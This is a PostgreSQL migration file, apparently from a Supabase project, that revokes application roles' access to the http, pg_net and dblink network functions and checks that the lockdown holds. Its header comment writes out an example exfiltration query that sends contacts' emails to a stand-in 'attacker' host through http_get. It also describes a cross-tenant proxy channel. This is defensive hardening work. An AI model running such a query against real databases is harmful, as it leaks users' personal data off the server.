-- Remove the database's outbound-network capability from application roles.
--
-- THE HOLE (reproduced 2026-09-11 against the pinned parser):
--   SELECT extensions.http_get('http://attacker/?d=' || (SELECT string_agg(email_jsonb::text, ',') FROM contacts))
-- is a syntactically READ-ONLY statement. It passes the MCP read-only gate, it
-- satisfies RLS (the rows are ones the caller may legitimately read), and it
-- posts them off-box anyway. `SET TRANSACTION READ ONLY` does not help: this is
-- not a database write. No parser rule can fix it either — the capability is a
-- privilege, so the boundary belongs in the privilege layer.
--
-- Also closed here:
--   * `http_set_curlopt` — session-scoped, NOT transaction-scoped. The MCP pool
--     has ONE connection shared across users, so setting CURLOPT_PROXY would
--     survive COMMIT into the next user's transaction: a cross-tenant channel.
--   * `net.*` — pg_net lives in schema `net`, not `extensions`, so a revoke
--     aimed at `extensions` alone would miss it. `net._http_response` also
--     holds every response body the database has ever fetched.
--
-- WHY NOT `REVOKE USAGE ON SCHEMA extensions`: it would break the product.
-- `companies.website` and `sales.email` are `extensions.citext`; filtering them
-- resolves the `citext = citext` operator BY NAME in `extensions`, and
-- PostgreSQL checks schema USAGE for by-name lookups. Plain SELECTs would keep
-- working while every filter broke — a confusing partial outage. USAGE stays;
-- the lockdown is function-scoped.
--
-- WHY DRIVEN OFF `pg_depend` RATHER THAN A SIGNATURE LIST: the `http` extension
-- exposes ~15 functions and the exact set changes with the extension version. A
-- hand-written list fails OPEN the moment an `ALTER EXTENSION ... UPDATE` adds
-- one. Revoking by extension membership covers every current and future member.
-- That is "unknown operations fail closed" applied to privileges themselves.

-- 1. Every function belonging to a network-capable extension, wherever it lives.
do $$
declare
  r record;
  v_roles text := 'public';
begin
  -- Only name roles that exist, so this runs on a bare Postgres too.
  if exists (select 1 from pg_roles where rolname = 'anon') then
    v_roles := v_roles || ', anon';
  end if;
  if exists (select 1 from pg_roles where rolname = 'authenticated') then
    v_roles := v_roles || ', authenticated';
  end if;

  for r in
    select p.oid::regprocedure as sig
    from pg_extension e
    join pg_depend d
      on d.refobjid = e.oid
     and d.refclassid = 'pg_extension'::regclass
     and d.classid = 'pg_proc'::regclass
    join pg_proc p on p.oid = d.objid
    where e.extname in ('http', 'pg_net', 'dblink')
  loop
    execute format('revoke execute on function %s from %s', r.sig, v_roles);
  end loop;
end
$$;

-- 2. pg_net's own schema, including the tables holding fetched response bodies.
--    Guarded: a database built from `schemas/` alone has no pg_net.
do $$
declare
  v_roles text := 'public';
begin
  if not exists (select 1 from pg_namespace where nspname = 'net') then
    return;
  end if;
  if exists (select 1 from pg_roles where rolname = 'anon') then
    v_roles := v_roles || ', anon';
  end if;
  if exists (select 1 from pg_roles where rolname = 'authenticated') then
    v_roles := v_roles || ', authenticated';
  end if;

  execute format('revoke all on schema net from %s', v_roles);
  execute format('revoke all on all tables in schema net from %s', v_roles);
  execute format('revoke all on all functions in schema net from %s', v_roles);
end
$$;

-- 3. Assert the end state, so a future change that re-grants network access
--    fails the migration instead of silently reopening the egress channel.
do $$
declare
  v_leaks text;
begin
  select string_agg(p.oid::regprocedure::text, ', ')
  into v_leaks
  from pg_extension e
  join pg_depend d
    on d.refobjid = e.oid
   and d.refclassid = 'pg_extension'::regclass
   and d.classid = 'pg_proc'::regclass
  join pg_proc p on p.oid = d.objid
  where e.extname in ('http', 'pg_net', 'dblink')
    and (
      has_function_privilege('public', p.oid, 'EXECUTE')
      or (
        exists (select 1 from pg_roles where rolname = 'authenticated')
        and has_function_privilege('authenticated', p.oid, 'EXECUTE')
      )
    );

  if v_leaks is not null then
    raise exception
      'network-capable functions still executable by application roles: %', v_leaks;
  end if;
end
$$;

-- KNOWN CONSEQUENCE, accepted deliberately:
-- `public.get_avatar_for_email` is SECURITY INVOKER and calls
-- `extensions.http_get` as the caller, so gravatar lookups now fail for
-- `authenticated`. The function has `exception when others then return 'ERROR'`
-- (02_functions.sql), so it DEGRADES — a contact gets no avatar — rather than
-- breaking the insert. Restoring the lookup means making that function
-- SECURITY DEFINER with a pinned `search_path`, which is a change to
-- 02_functions.sql whose body must match `supabase db dump` byte-for-byte.
-- That needs a live database to regenerate, so it is deliberately NOT done
-- here: an avatar is worth less than closing an exfiltration channel.
--
-- `service_role` is intentionally NOT revoked. Edge functions run as it, they
-- are server-side, and breaking them blind (no database to test against) would
-- trade a real outage for a marginal gain. Tightening it is a follow-up to run
-- once Docker is available.
